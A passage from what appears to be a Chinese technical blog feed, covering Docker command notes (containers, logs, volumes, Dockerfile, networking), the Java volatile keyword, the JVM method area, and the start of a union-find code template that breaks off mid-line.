class="line"></span><br><span class="line"><span class="comment"># 4.删除</span></span><br><span class="line">docker rm 容器id		<span class="comment"># 删除容器（只有删除容器，数据才会删除）</span></span><br><span class="line">docker rm -f $(docker ps -aq)		<span class="comment"># 删除所有容器</span></span><br><span class="line">docker ps -a -q | xrags docker rm	<span class="comment"># 删除所有容器（竖线表示前面的结果作为后面的输入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.启动</span></span><br><span class="line">docker start 容器id		<span class="comment"># 启动已经停止的容器（区别于docker run）</span></span><br><span class="line">docker restart 容器id		<span class="comment"># 重启</span></span><br><span class="line">docker stop 容器id		<span class="comment"># 停止</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器id		<span class="comment"># 强制停止</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.进容器</span></span><br><span class="line">docker <span class="built_in">exec</span> [options] container <span class="built_in">command</span> [args]		<span class="comment"># 进入正在运行的容器中</span></span><br><span class="line">	<span class="comment"># -d		分离模式：在后台运行</span></span><br><span class="line">	<span class="comment"># -i		交互模式，如果不加，则无法与用户交互（一般-it一块使用）</span></span><br><span class="line">	<span class="comment"># -t		分配一个伪终端，如果不加，则没有终端（一般-it一块使用）</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器id /bin/bash		  <span class="comment"># 进入容器后开启一个新的终端，在其中操作（是守护模式，执行exit后不会终止容器）（退出以该种方式进入的容器的时候，只会关闭该伪终端，而不会影响容器的原先运行状态）</span></span><br><span class="line">docker attach [options] container	   <span class="comment"># 进入容器创建时的终端，所以执行exit之后会停止容器（如果容器创建时时-d模式，则创建时的终端程序是sshd-D，该进程不接收输入的；如果创建时候是交互模式，即-it，则执行该命令之后可以顺利进入终端）</span></span><br><span class="line"><span class="comment"># 备注：docker attach再次进入的是容器的主进程的标准输入输出流（即一开始创建容器的时候，创建的伪终端；而不是使用docker exec -it进入的容器而产生的伪终端；即使在退出使用docker exec -it进入容器产生的伪终端，由于使用ctrl+p+q退出而没有消失，docker attach也不会连接到这个伪终端）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.容器中进程</span></span><br><span class="line">docker top 容器id			<span class="comment"># 容器中进程信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.元数据</span></span><br><span class="line">docker inspect [options] 容器name|镜像name	<span class="comment"># 容器或者镜像的元数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 日志 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日志</span></span><br><span class="line">docker logs 参数 容器名/容器id</span><br><span class="line">	<span class="comment"># --details 			显示提供给日志的其他详细信息</span></span><br><span class="line">	<span class="comment"># --follow , -f 		实时跟踪日志输出</span></span><br><span class="line">	<span class="comment"># --since 				显示自某个timestamp之后的日志大于等于某个时间，或相对时间，如1h 就是1h）</span></span><br><span class="line">	<span class="comment"># --tail n				从末尾显示n条</span></span><br><span class="line">	<span class="comment"># -n  m或all 			m数，默认值为all 全部</span></span><br><span class="line">	<span class="comment"># --timestamps , -t 	日志每行显示日志时间戳</span></span><br><span class="line">	<span class="comment"># --until 				显示自某个timestamp之前的日志小于等于某个时间，或相对时间，如30m（即30分钟）</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker logs -tf --tail 10 容器id		<span class="comment"># 倒序显示指定容器实时10条日志，每条带有时间戳</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 其他指令 ------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看端口号</span></span><br><span class="line">docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝</span></span><br><span class="line">docker cp 容器id:容器内路径 目的主机路径		<span class="comment"># 拷贝容器的文件到主机中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建镜像</span></span><br><span class="line">docker commit [options] container [repository:tag]		<span class="comment"># 提交指定容器成为一个新的副本</span></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker commit -m=<span class="string">&quot;描述信息，类似git的提交信息&quot;</span> -a=<span class="string">&quot;作者&quot;</span> 容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 添加加速器（使用其他镜像源） ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑 /etc/docker/daemon.json 文件</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># 该文件中写入以下内容</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://yxzrazem.mirror.aliyuncs.com&quot;</span>, <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>, <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 保存退出后，重启docker服务</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="坑1：启动容器，自动停止"><a href="#坑1：启动容器，自动停止" class="headerlink" title="坑1：启动容器，自动停止"></a>坑1：启动容器，自动停止</h3><p><strong>取决于：</strong>当前docker是否有前台进程正在运行（没有的话，docker容器会自动停止）</p>
<p><strong>可能1</strong>：docker容器使用后台运行，就必须要有一个<strong>前台进程</strong>，docker发现没有应用了，就会自动停止 。例如：nginx，容器启动后发现自己没有<strong>提供服务</strong>，就会立刻停止，就是没有程序了。</p>
<p><strong>可能2</strong>：<code>docker run -d …</code>最后面加了<code>/bin/bash</code></p>
<blockquote>
<p> <strong>解决方案1</strong>：一般<code>-it</code>启动的时候后面会有一个<code>/bin/bash</code>。</p>
</blockquote>
<blockquote>
<p><strong>解决方案2</strong>：父容器进程可能有一个子进程（即一个容器可能是一组进程）。</p>
</blockquote>
<blockquote>
<p><strong>例如Nginx容器启动</strong>：当我们启动一个nginx服务时，它会启动一个父Nginx进程，然后父进程跨越进它的子进程，比如内存管理器、缓存加载器和工作器。</p>
</blockquote>
<h3 id="坑2：执行exit是否终止容器"><a href="#坑2：执行exit是否终止容器" class="headerlink" title="坑2：执行exit是否终止容器"></a>坑2：执行exit是否终止容器</h3><p><strong>取决于：</strong>当前的终端是不是在创建容器是的初始终端。如果是，则退出容器时，容器也停止；如果不是（例如进入容器时使用<code>-it</code>模式），退出时，仅退出当前的终端，容器继续运行</p>
<p><strong>举例：</strong>先进后出：</p>
<table>
<thead>
<tr>
<th>退出方式</th>
<th>exec进入方式（进入守护模式，同守护模式启动）</th>
<th>attach进入方式（进入非守护模式）</th>
</tr>
</thead>
<tbody><tr>
<td>exit退出方式</td>
<td>容器还在</td>
<td>容器不在</td>
</tr>
<tr>
<td>ctrl+p+q退出方式（一定不终止容器）</td>
<td>容器还在</td>
<td>容器还在</td>
</tr>
</tbody></table>
<h3 id="坑3：执行docker-attach卡住"><a href="#坑3：执行docker-attach卡住" class="headerlink" title="坑3：执行docker attach卡住"></a>坑3：执行docker attach卡住</h3><p><strong>取决于：</strong>创建容器的时候，是后台运行模式还是交互模式，前者使用的是<code>sshd-D</code>程序（不接收输入），后者使用的是<code>bash</code>（交互型的，接收输入）</p>
<p>先出后进：<code>docker attach</code>能否成功进入容器，取决于容器在<code>run</code>启动时是<strong>交互模式</strong>还是<strong>守护模式</strong>启动的</p>
<h2 id="常用Docker工具"><a href="#常用Docker工具" class="headerlink" title="常用Docker工具"></a>常用Docker工具</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.Docker UI</span></span><br><span class="line">docker search dockerui</span><br><span class="line">docker pull abh1nav/dockerui</span><br><span class="line">docker run -d --privileged --name dockerui -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock abh1nav/dockerui		<span class="comment">#放开物理机的9000端口对应Docker容器的9000端口</span></span><br><span class="line">curl localhost:9000			<span class="comment"># 访问地址：http://ip地址:9000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.Portainer</span></span><br><span class="line">docker search portainer</span><br><span class="line">docker pull portainer/portainer</span><br><span class="line">docker run -d --name portainerUI -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer</span><br><span class="line">curl localhost:9000			<span class="comment"># 访问地址：http://ip地址:9000</span></span><br></pre></td></tr></table></figure>

<h2 id="常见容器案例"><a href="#常见容器案例" class="headerlink" title="常见容器案例"></a>常见容器案例</h2><h3 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="1.Nginx"></a>1.Nginx</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search nginx				<span class="comment"># 查找镜像</span></span><br><span class="line">docker pull nginx				<span class="comment"># 下载镜像</span></span><br><span class="line">docker run -d --name nginx -p 3344:80 nginx		<span class="comment"># 创建并在后台运行容器</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it nginx /bin/bash		<span class="comment"># 进入容器</span></span><br></pre></td></tr></table></figure>

<h3 id="2-Tomcat"><a href="#2-Tomcat" class="headerlink" title="2.Tomcat"></a>2.Tomcat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull tomcat 			<span class="comment"># 下载镜像</span></span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat	<span class="comment"># 后台启动</span></span><br><span class="line">docker <span class="built_in">exec</span> -it tomcat01 /bin/bash		<span class="comment"># 进入容器</span></span><br><span class="line"><span class="comment"># webapps下内容为空，阿里云默认时最小的镜像，所有不必要的都剔除了</span></span><br><span class="line"><span class="comment"># 保证最小运行环境即可</span></span><br><span class="line">cp -r webapps.dist/* webapps	<span class="comment"># 网站恢复访问</span></span><br></pre></td></tr></table></figure>

<h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul>
<li>数据持久化</li>
<li>容器之间共享数据</li>
</ul>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>生命周期：数据卷存在于宿主机的文件系统中，独立于容器，和容器的生命周期分离</li>
<li>存在形式：目录或文件</li>
<li>作用域：<ul>
<li>容器和数据卷的数据变化<strong>实时同步</strong>发生。</li>
<li>数据卷的数据变换不影响镜像变化</li>
</ul>
</li>
<li>挂载时：<ul>
<li>数据卷空，容器中目录非空，则容器中数据复制到数据卷中</li>
<li>数据卷不空，容器中目录非空，则显示数据卷内容，容器目录仅显示数据卷中数据，其余被隐藏</li>
</ul>
</li>
</ol>
<h3 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">------------ 方式1：在docker run基础上，使用命令来挂载 -v ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -v 主机目录:容器内目录 container [<span class="built_in">command</span>] [args]</span><br><span class="line">	<span class="comment"># -v 容器内路径 		 			匿名挂载</span></span><br><span class="line">	<span class="comment"># -v 卷名:容器内路径	           具名挂载</span></span><br><span class="line">	<span class="comment"># -v /宿主机路径:容器内路径  	 指定路径挂载</span></span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line">docker run -d -P --name nginx01 -v 容器内目录 container [<span class="built_in">command</span>] [args]	<span class="comment"># 匿名挂载，只写了容器内的路径，没有写容器外的路径</span></span><br><span class="line">docker run -d -P --name nginx01 -v [主机目录|主机文件名]:容器内目录 container [<span class="built_in">command</span>] [args]		<span class="comment"># 具名挂载</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据卷</span></span><br><span class="line">docker volume ls	<span class="comment"># 查看所有volume</span></span><br><span class="line">docker volume inspect [options] volume [volume2…]	<span class="comment"># 查看指定的数据卷的信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没有指定目录（即使用主机文件名）时，数据在/var/lib/docker/volumes/xxxx/_data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ 方式2：使用DockerFile来挂载 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步准备：创建文件dockerfile1，vim输入内容如下：</span></span><br><span class="line">from centos</span><br><span class="line">volume [<span class="string">&quot;volume01&quot;</span>,<span class="string">&quot;volume01&quot;</span>]		<span class="comment"># ★匿名挂载。在构建镜像时，生成这两个目录，并自动挂载到宿主机的数据卷目录中</span></span><br><span class="line">cmd <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">cmd /bin/bash</span><br><span class="line"><span class="comment"># 以上一层代表一层镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：build镜像</span></span><br><span class="line">docker build -f dockerfile1的文件地址 -t 目标镜像名称[:tag]  .		</span><br><span class="line">	<span class="comment"># 结尾的.符号，指的是在构建镜像的过程中的上下文环境的目录（比如在dockerfile文件中使用了copy等指令来操作文件，此处的.就指定了这些指令执行时的上下文环境地址）</span></span><br><span class="line">	<span class="comment">#挂载数据卷的目录在dockerfile的volume后面指定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ --volumes-from实现容器之间的数据同步 ------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it --name container02 --volumes-from container01 镜像:[tag]		</span><br><span class="line">	<span class="comment"># 通过--volumes-from做到两个容器之间的数据同步（同步挂载：son extend father）</span></span><br><span class="line">	<span class="comment"># 好处：多个容器时，只需挂载其中一个容器到数据卷，其余容器创建时只需要使用--volumes-from即可</span></span><br></pre></td></tr></table></figure>

<h2 id="DockerFile详解"><a href="#DockerFile详解" class="headerlink" title="DockerFile详解"></a>DockerFile详解</h2><p>构建发布镜像步骤：</p>
<ol>
<li>构建一个dockerfile文件</li>
<li>docker build构建成为一个镜像</li>
<li>docker run运行一个镜像</li>
<li>docker push发布镜像（DockerHub、阿里云镜像仓库）</li>
</ol>
<h3 id="构建Dockerfile文件"><a href="#构建Dockerfile文件" class="headerlink" title="构建Dockerfile文件"></a>构建Dockerfile文件</h3><table>
<thead>
<tr>
<th>关键字</th>
<th>作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>from</td>
<td>指定父镜像</td>
<td>指定dockerfile基于哪个image构建</td>
</tr>
<tr>
<td>maintainer</td>
<td>作者信息</td>
<td>表明作者（姓名+邮箱）</td>
</tr>
<tr>
<td>label</td>
<td>标签</td>
<td>表明dockerfile的标签，可以使用label代替maintainer，最终都是在docker image基本信息中可以查看</td>
</tr>
<tr>
<td>run</td>
<td>执行命令</td>
<td>执行一段命令，默认是/bin/bash<br />格式：run command 或者 run [“command”, “param1”, “param”]<br /><strong>run对docker容器造成的改变会反映到创建的镜像上</strong></td>
</tr>
<tr>
<td>cmd</td>
<td>容器启动命令</td>
<td>提供run容器时候的默认命令，和entrypoint配合使用<br />格式：cmd command param1 param2 或者cmd [“command”, “param1”, “param2”]<br />只有最后一个生效（一个dockerfile只有一个cmd）</td>
</tr>
<tr>
<td>entrypoint</td>
<td>入口</td>
<td>一般在制作一些执行就关闭的容器中使用</td>
</tr>
<tr>
<td>copy</td>
<td>复制文件</td>
<td>build时，复制文件到image中</td>
</tr>
<tr>
<td>add</td>
<td>添加文件</td>
<td>build时，添加文件到image中<br />不仅仅局限于当前build上下文，可以来源于远程服务</td>
</tr>
<tr>
<td>env</td>
<td>环境变量</td>
<td>指定build时候的环境变量<br />可以在启动的容器时，通过-e覆盖<br />格式：env name=value</td>
</tr>
<tr>
<td>arg</td>
<td>构建参数</td>
<td>只在构建时候使用的参数<br />env相同名字的变量会覆盖arg的同名变量</td>
</tr>
<tr>
<td>volume</td>
<td>定义外部可以挂载的数据卷</td>
<td>指定build的image哪些目录可以启动的时候挂载到文件系统中<br />启动容器时，使用-v绑定 <br />格式：volume [“目录”]</td>
</tr>
<tr>
<td>expose</td>
<td>暴露端口</td>
<td>定义容器运行时候监听的端口<br />启动容器时使用-p来绑定暴露端口<br />格式：expose 8080或者expose 8080/udp</td>
</tr>
<tr>
<td>workdir</td>
<td>工作目录</td>
<td>指定容器内部的工作目录，如果没有创建则自动创建，如果指定/使用的时绝对地址，如果不是/开头那么是在上一条workdir的路径的相对地址<br />主要为run、cmd、entrypoint、copy、add指定工作目录</td>
</tr>
<tr>
<td>user</td>
<td>指定执行用户</td>
<td>指定build或者启动的时候，用户在run cmd entrypoint执行的时候的用户<br /></td>
</tr>
<tr>
<td>healthcheck</td>
<td>健康检查</td>
<td>指定监测当前容器的健康监测的命令，基本没用，通常应用本身有健康监测机制</td>
</tr>
<tr>
<td>onbuild</td>
<td>触发器</td>
<td>当执行from完成之后会执行onbuild的命令<br />不影响当前镜像，用处不大</td>
</tr>
<tr>
<td>stopsignal</td>
<td>发送信号量到宿主机</td>
<td>该指令设置将发送到容器的系统调用信号以退出</td>
</tr>
<tr>
<td>shell</td>
<td>指定执行脚本的shell</td>
<td>指定run cmd entrypoint 执行命令的时候 使用的shell</td>
</tr>
</tbody></table>
<ul>
<li>workdir区别于docker build最后的path地址，前者指的时<strong>容器内的工作目录</strong>，后者是指镜像在构建过程中<strong>对主机中的资源操作时的上下文环境</strong></li>
<li>cmd和entrypoint区别<ul>
<li>cmd：指定这个容器启动时候要运行的命令，只有最后一个会生效，可替代</li>
<li>entrypoint：指定这个容器启动时候要运行的命令，可以追加命令</li>
</ul>
</li>
</ul>
<h3 id="Dockerfile案例"><a href="#Dockerfile案例" class="headerlink" title="Dockerfile案例"></a>Dockerfile案例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7						<span class="comment"># 设置镜像使用的基础镜像</span></span><br><span class="line">MAINTAINER lixingze&lt;lixingzee@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /user/<span class="built_in">local</span></span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span>						<span class="comment"># docker run之后的工作目录</span></span><br><span class="line"></span><br><span class="line">RUN yum -y install vim				<span class="comment"># 安装vim到镜像中</span></span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="Docker网路"><a href="#Docker网路" class="headerlink" title="Docker网路"></a>Docker网路</h2><p>容器之间可以互相ping通。</p>
<p>所有容器不指定网络情况下，都是docker0路由的，docker会给我们容器分配一个默认可用ip地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip和网卡</span></span><br><span class="line">ip addr		<span class="comment"># 查看容器的内部网卡、ip地址（需要iproute2工具）</span></span><br><span class="line">或</span><br><span class="line">ifconfig	<span class="comment"># 查看容器的内部网卡、ip地址（需要net-tools工具）</span></span><br><span class="line"><span class="comment"># 如果命令找不到，安装net-tools、iproute2、iputils-ping（可以使用ping命令）</span></span><br></pre></td></tr></table></figure>

<p>每个容器带来的网卡都是一对一对的，只要删除容器，对应网桥一对就没了。</p>
<p>docker中所有网络接口都是虚拟的，虚拟的转发效率高！（内网传递文件）</p>
<p>docker使用的时Linux的桥接，宿主机中是一个docker同期的网桥docker0。</p>
<p><strong>docker0特点，默认，容器名不能访问， –link可以打通连接！（单向的，本质上在容器的hosts中增加了一个代理：<code>172.17.0.3 tomcat02 56140c84bab0</code>）</strong></p>
<p>所以，需要<strong>自定义网络！不使用Docker0！</strong></p>
<h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><p>网络模式：</p>
<ul>
<li>bridge：桥接模式，docker默认方式，自定义的网络也是bridge模式</li>
<li>none：不配置网络</li>
<li>host：和宿主机共享网络</li>
<li>container：容器网络联通（用的很好，局限大）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">docker network ls		<span class="comment"># 查看所有网络</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 例</span></span><br><span class="line">docker run -d -P --name tomcat01 tomcat</span><br><span class="line">docker run -d -P --name tomcat01 --net bridge tomcat		<span class="comment"># 默认就是bridge，而这个bridge就代表的docker0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义一个网络</span></span><br><span class="line">docker network create --driver 网络模式 --subnet 子网的网络号/子网掩码 --gateway 网关设置 网络名称			<span class="comment"># 创建一个自定义网络，指定网络模式、网络地址规定、网关地址、网络名称</span></span><br><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器（指定网络）</span></span><br><span class="line">docker run -d -P --name 容器名称 --net 网络名称 镜像文件	<span class="comment"># 启动一个容器，指明自定义的网络名称（若不指定，则默认是docker0），就可以通过容器名字实现容器之间的互相访问</span></span><br><span class="line"></span><br><span class="line">docker network inspect 容器id</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p> <em>等接触到集群的时候再继续更新docker中集群的知识</em></p>
</blockquote>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>volatile用法</title>
    <url>/2024/11/05/volatile%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h2 id="volatile的作用"><a href="#volatile的作用" class="headerlink" title="volatile的作用"></a>volatile的作用</h2><span id="more"></span>

<p>首先，<code>volatile</code>关键字<strong>只能修饰变量</strong>，不能修饰方法或者代码块</p>
<p><code>volatile</code>有两个作用：</p>
<ul>
<li><strong>保证线程的可见性</strong>：一个线程对<code>volatile</code>变量的修改，会立刻反映到其他线程中，其他线程能够立刻看到这个变量的最新值，<strong>避免出现多线程中变量数据不一致的问题</strong></li>
<li><strong>禁止指令重排序</strong>：<code>volatile</code>变量的写操作之前的所有操作，即使重排序，会被重排序到写操作之前；而写操作之后的所有操作，即使重排序，也只会重排序到写操作之后。保证了多线程操作的逻辑正确性</li>
</ul>
<h2 id="为什么会指令重排序？"><a href="#为什么会指令重排序？" class="headerlink" title="为什么会指令重排序？"></a>为什么会指令重排序？</h2><p>白话就是“<strong>实际执行的代码顺序和写的代码顺序不一样</strong>”</p>
<p><strong>原因：</strong>指令重排序是由编译器、处理器（CPU）或多线程调度器在优化程序执行效率时进行的一种操作，<strong>改变了代码中的某些指令的执行顺序</strong>（<strong>但不会更改代码的逻辑顺序</strong>）。</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20241105163614.png" alt="image-20241105163613068"></p>
<p><strong>特点：</strong></p>
<ul>
<li>单线程中，即使指令重排序，因为不会改变逻辑顺序（依赖关系），所以不会对结果产生影响，只会提升效率</li>
<li>多线程中，由于在不同线程之间存在共享资源，指令重排序改变了程序中的某些操作的执行顺序，可能导致不同线程之间的操作不按预期顺序进行的问题。</li>
</ul>
<h2 id="volatile如何禁止指令重排序？"><a href="#volatile如何禁止指令重排序？" class="headerlink" title="volatile如何禁止指令重排序？"></a>volatile如何禁止指令重排序？</h2><p>更严格地说，应该叫做“<strong>volatile禁止指定变量参与指令重排序</strong>”</p>
<p><strong>原理：</strong>volatile通过<strong>内存屏障</strong>来禁止指令重排序</p>
<p>JVM内存屏障地策略</p>
<ul>
<li>在每个<code>volatile</code>写操作的前面插入一个StoreStore屏障。</li>
<li>在每个<code>volatile</code>写操作的后面插入一个StoreLoad屏障。</li>
<li>在每个<code>volatile</code>读操作的前面插入一个LoadLoad屏障。</li>
<li>在每个<code>volatile</code>读操作的后面插入一个LoadStore屏障。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20241105164822.png" alt="image-20241105164821128"></p>
<blockquote>
<p>这个原理流程图我还没琢磨透，但是简而言之，按照如下意思理解就可以了：</p>
</blockquote>
<p>原本代码块都会被指令重排，但是如果一个变量被<code>volatile</code>修饰了，在编译和处理器阶段（即发生指令重排序的时候），将会分为三部分：</p>
<ul>
<li>①<code>volatile</code>之前的代码</li>
<li>②<code>volatile</code>修饰的变量的代码</li>
<li>③<code>volatile</code>之后的代码；</li>
<li>其中①和③分别进行指令重排序（前面的代码不会重拍到后面，后面的代码不会重排到前面），这样就避免了重排序导致的多线程逻辑错误</li>
</ul>
]]></content>
      <tags>
        <tag>JVM</tag>
        <tag>多线程</tag>
        <tag>锁</tag>
        <tag>指令重排序</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（5）——理解方法区（元空间、永久代）</title>
    <url>/2024/12/10/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%885%EF%BC%89%E2%80%94%E2%80%94%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8C%BA%EF%BC%88%E5%85%83%E7%A9%BA%E9%97%B4%E3%80%81%E6%B0%B8%E4%B9%85%E4%BB%A3%EF%BC%89/</url>
    <content><![CDATA[<h2 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h2><span id="more"></span>

<p>在<code>JDK 8</code>版本之前，也叫<strong>永久代</strong>；<code>JDK 8</code>版本之后，改名为了<strong>方法区（元空间，方法区的实现是元空间）</strong></p>
<p><strong>功能：</strong></p>
<ul>
<li>存储一些<code>static</code>修饰的东西</li>
<li>存储一些<code>classloader</code>和一些<code>class</code>对象（包含类的元信息，例如方法表、字段表）（<strong>而实例对象在堆中</strong>）</li>
<li><strong>在<code>JDK 1.7</code>版本以前，方法区还存储字符串常量池；但是，从<code>JDK1.7</code>开始，字符串常量池转移到堆中</strong></li>
</ul>
<h2 id="其他区域解释"><a href="#其他区域解释" class="headerlink" title="其他区域解释"></a>其他区域解释</h2><p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-10-18-18-37.png" alt="image-20241210181836591"></p>
<h3 id="各区解释"><a href="#各区解释" class="headerlink" title="各区解释"></a>各区解释</h3><p><strong>栈（JVM栈）：存储一些函数方法当前运行中的临时变量</strong></p>
<p>本地方法栈：存储C++的一些native的方法（因为Java的底层就是C++）</p>
<p>程序计数器：指向程序当前执行的位置</p>
<p><strong>方法区：存储一些一些静态的方法、变量，还有类加载器之类的数据</strong></p>
<p><strong>堆区：存储对象实例数据（而对应的变量，即对象的引用变量，是存储在栈中，或者堆中的对象实例数据中的变量（即对象的引用变量可能在栈中，也可能在堆中的对象实例数据中）），还有字符串常量池也在堆区</strong></p>
<blockquote>
<p>从 <code>JDK 7</code> 开始，字符串常量池被移到了堆内存中，而不再存储在方法区（永久代）中</p>
<p><strong>字符串常量池的位置</strong>:</p>
<ul>
<li><strong><code>JDK 7</code> 之前</strong>: 方法区（永久代）。</li>
<li><strong><code>JDK 7</code> 及之后</strong>: 堆内存。</li>
</ul>
<p>移动到堆内存后，字符串常量池更加灵活，避免了永久代空间不足的问题。</p>
</blockquote>
<h3 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h3><p><strong>栈（JVM栈）、本地方法栈、程序计数器，这三个是==线程私有==的，有多少个线程，就有多少个这样的区域</strong></p>
<p><strong>堆区、方法区是==全局共享==的（即线程共享，都可以访问）</strong></p>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>java基础</tag>
        <tag>方法区</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-并查集</title>
    <url>/2024/12/11/%E7%AE%97%E6%B3%95-%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    <content><![CDATA[<h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul>
<li>将两个元素添加到一个集合中。</li>
<li>判断两个元素在不在同一个集合</li>
</ul>
<h3 id="常用场景"><a href="#常用场景" class="headerlink" title="常用场景"></a>常用场景</h3><ol>
<li>判断图中的连通性：通过使用并查集，我们可以快速判断图中任意两个节点是否连通。首先，我们需要构建一个图的邻接表表示法，然后使用并查集来处理不相交节点的集合。如果两个节点属于同一个集合，则它们是连通的；否则，它们是不连通的。</li>
<li>最小生成树问题：最小生成树问题是求解一个带权重的连通无环图的最小生成树。通过使用并查集，我们可以方便地处理带权重的边和顶点之间的关系，从而高效地求解最小生成树问题。</li>
<li>网络连接问题：在网络连接问题中，我们需要判断两个节点之间是否存在路径或网络连接。通过使用并查集，我们可以快速判断两个节点是否连通，从而解决网络连接问题。</li>
</ol>
<h3 id="思想核心"><a href="#思想核心" class="headerlink" title="思想核心"></a>思想核心</h3><p>维护一个数组：<code>father[]</code>数组，可以从树结构出发，理解为记录元素的父节点<br>维护四个函数：<code>init()</code>、<code>find(int u)</code>、<code>isSame(int u, int v)</code>、<code>join()</code><br><strong>代码模板</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化father数组</span></span><br><span class="line"><span class="keyword">int</span>[] father = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并查集初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        father[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 并查集里寻根的过程</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> u 